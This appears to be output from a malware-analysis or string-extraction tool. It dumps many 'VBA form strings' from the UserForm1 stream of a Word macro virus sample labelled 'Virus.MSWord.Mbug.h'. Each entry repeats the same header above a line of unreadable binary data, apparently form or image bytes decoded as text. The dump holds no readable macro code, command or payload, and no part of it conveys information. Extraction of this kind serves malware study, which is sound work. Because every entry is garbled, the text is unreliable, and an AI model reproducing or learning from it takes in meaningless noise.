- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B!1kBMk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B!1kGF�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
29)93#)3#)1%1=-1F-=991F-=991J99=-1H/?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�~����ܴ�������k^gJJRPZmJJR<.<991)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))%99)93#)3#)))!')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)')-)!))!))!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
29993#)3#))!))!))%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)199JJRsemJJR!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BJBJkVcum�wos{u~�o�iiqB9J999)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!iiqsx�um�um��o�wos�o�um����o��o�wos{���kkB=k$3�{{�޸�ƨ�ƨ枟ֈ�أ�ࣟ൯�µ�µ�µ�µ�ƨ�̹�9Fc1)Bkk1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B5:k}r�������ҧ�ҧ����������3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N%)o9Fc)Bo4En5:kBMk9I�)Bo9Fc)Bo19c1-X'1Y#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)BoK[�'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##Xew�BMk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!=-1=-11%19)9F-=9)9F-=991F-=H/?���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)}r�ܴ���������k^gB9BB9B3#)')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)3=TN?Vk^g^Rc))!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)1)BJJRiiq�o�woskkiiqJJZ9)93#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B/V{�wosum�{u~sx��o�{u~{��o�sx�{u~{�sx���k^g1-X`bǙ��޸�µ�µ興ص�㰧ʈ�ص��µ赡�ƨ浡�µ�~��#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=^RccZk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BJJZt_���������{qi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B!1k)5k19c5:k4En4En4En5:kLY�)Bo)Bo9Fc!1k'1Y19J'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X9I�BMk19J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^FV����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)%93#)=-11%1=-1F-=9999)9BB9F-=9)9DD;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)t_��������~�xcsk^gJBJ<.<)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)3#)')-)%93#)3.+)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))!))%9B9BJJR[Zlccc9)9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)99JZKUiiqum�um�sem[ZlB9B199
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a[~sx�{u~{�um�um�{u~wos{u~sx��o�{������o�NPT1-X������޸鵯ⵡ㣟�{{ң�����µ�µ�µ�µ�ƨ�µ�xw�19Jiiqxcs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91)BJBBJ9R1)B'1Y'1Y)5k19c)Bo19c4En4En4En4En5:k4En)Bo3=T19c##X'1Y#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X%-sXe�dt�]i�'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N&-�~��3=T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2=-13#)=-11%19)9F-==-1BB9F-=F-=LDD���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a[~�������������o|JBJ1%1!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)9)91999)9<.<9)93.+)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)')-3#)19JB9JJJR^RckVc^RcBBR)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)99JcZkiiq{u~kkk^gJBJ3.D')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)B{�um�wosum�wosum�um�um�um�{^c{�wos{�sx�kk1)B+)�{{ҵ��ƨ浯�ƨ棟���ص�ⵡ㵡����µ�޸�µ�µ�ai~XFmwosiiq#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B!1k)Bo9Fc19c4En19c4En5:k4En4En4En)Bo19J!1k19J'1Y#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=##X!1kK[�ew�Xe�BMk##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X!1k.D�1E�~��]i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)3#)1%1=-1=-19)9999F-=9919)9BB9LDD���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!XFm����~���������cZkJ9R<.<999199B9B9)9199199!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!))%9..9BBRBFF^Rc[ZlkVckk^RcJBB))!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3.+BBRiiqkkum�wosZKU99J3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9kk{u~xcs�o�um�um�wosum�kkum�kkum�{u~sx�{�PZm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9DL����µ赡�ƨ晍ۣ��ƨ攠ޣ�ൡ�µ�µ�µ�µ裟�kkkkum�9Fc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N'1Y99{)BoBMk)Bo4En4En4En5:k4En5:k)Bo19J##X'1Y1-X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J%-s9I�9I�5:k)5k##X'1Y!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X!1k!1k9I�K[�DL�ew�������19c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#))!)=-1=-1199999F-=9)9F-=F-=BB9LDD���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B/V����o�k^gsemkkZKUBBRJJRJJZB9JB9BJBB199)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))!)1)B1)BJBJ<<?[Zlk^gk^gsemiiqk^gXFm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!9)9JJRiiqum�k^g{u~BFF999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99J{�sx��o�iiqum�um�um�kkwosum�{u~sx�kk}r�kk3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BN]���㣟൯⣟�~��޸鵡㈈�ƨ�޸�µ�µ�ƨ�޸�{{�kkwosPZm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N%)o9Fc)Bo19c4En4EnBMk9I�4En4En4En)Bo19c'1Y1-X##X!1k19c!1k!1k##X)5k5:k3=T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D%-s4En9I�K[�Xe�dt�~��~�Ϟ�����ƫ�LY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)9)93#)=-19)9<.<F-=991=-1JBBJBBL;;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J���sx�ZKUJJZJBB1)B!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)3#)..93#))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))%99)9)%93.DJBBJJZ^Rc^Rc[ZlkVcwosum�cckkVc3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)1)BPZmcRkk^gkkZKU<.<3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
')-gZsum�{^cum�kk{^ckkwoskkum�um�k^g{�um�{�NPT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+)�iu͵��޸�{{�ƨ�ƨ棟ൡ㣟�µ�µ赡�µ�µ�µ�}��sx�kk#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9Fc)Bo19c19c19c4EnBMk5:k4EnBMk4En)Bo'1Y1-X##X!1k%)o19c!1k%-s1E�K[�9I�K[�dt�ew�ew�~��~�ϛ�Ǟ�ֵ�����������GF�!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)3#)=-19919)9F-=999F-=BB9J99JBBLDD���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�~�sx�N?V<.<')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)9)93#)3.D99JB9B9)9JJZkVciiqcZkcckiiqk^g{u~cckJBB')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!')-99JJJRiiqiiqcZkJBB3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!BBRum�um�kkiiqum�um�kkiiqkkkkiiqkkum�{�sx�999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!GF���ۣ�ൡ㣟ൡ㵯∈�޸�µ�µ�޸�µ�޸�µ赡�~�iiq1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1-X19c)Bo19c)Bo5:k4En4En4En5:k4En)Bo19c19c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z##X!1k%-s.?�9L�Xe�ew�ew�ew�~��~�ϛ�Ǟ�֣��µ�̹�����������9I�!1k.D�.3~1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)!)3#)1%1=-19)9BB9=-19)99)9B9B9)9F-=DD;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)t_���JJR<.<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#))%91)B9913#))%91)B)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)1)BZKUiiqk^gk^giiqxcskkk^g^Rc))!')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9JBJk^giiqxcsJJZ991)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)iiqum�iiqum�semum�um�um�kkkkk^gk^gkkwos���~�)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9`bǵ�㙍�ƨ棟�{{ҵ�㵡㙍۵��µ赡�µ�µ�µ螟�sx�JJZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
219J)5k)5k19c19c4En4En5:k4En4En5:k)Bo19c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^!1k!1k.3~1E�DL�ew�~�ϛ�ǔ�ޞ�֔�ޞ�ֵ��������������������FV�.D�DL�ew�ew�dt�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)1)B3#)B9B9)9=-19)9BB9=-1J99JBBB9BL;;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)XFm���kVcJBJ)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)1)B)%9)!))%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)BBRiiqxcscckcckk^gcckk^gk^g)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BJJRk^gwosiiqJBB)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BBRsx�kkiiqkkum�kkkkwoskkiiqkkkkkkum�����mn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c`b�ƨ晍۵��{{ҙ�۵�㙍ۈ��޸鵡�µ�µ赡�̹䌅�PZm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)%91-X!1k)5k)5k19c4En4En4En19c4En)Bo9Fc.3~.D�1E�DL�Xe�ew�~�Ϟ�֔�ޞ�ֵ�ⵯ������������൯�~��N]�K[�DL�ew���ޔ�ް��µ�a[~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)1%1999999999F-=991F-=BB9BB9=-1L;;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
41l����o|JBJ3.D3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))%91)B3#))!)1-X)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)9)9[Zlwos[ZlcZkkVciiqcccai~)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9BBR[ZlkkiiqZKUB9B!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kk{u~um�{�wosum�wosum�kkkkkkiiqsemkksx����ZKU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)&-�{{�ƨ晍�{{�ƫ͙�ۙ�ۙ�۵��µ�µ�µ赡�µ赡�fs�19J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)%91)B19J%)o)5k)Bo1-X19c4En)BoBMk4En)Bo9I�DL�ew�ew�ew�~�ϔ��̹�������������µ蔠�iu�ew�ew�ew�~��~�ϛ�ǰ��̹����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)1)B9999)99)9F-=F-=9)9=-1F-=9999)9;;3���

#
-------------------------------------------------------------------------------
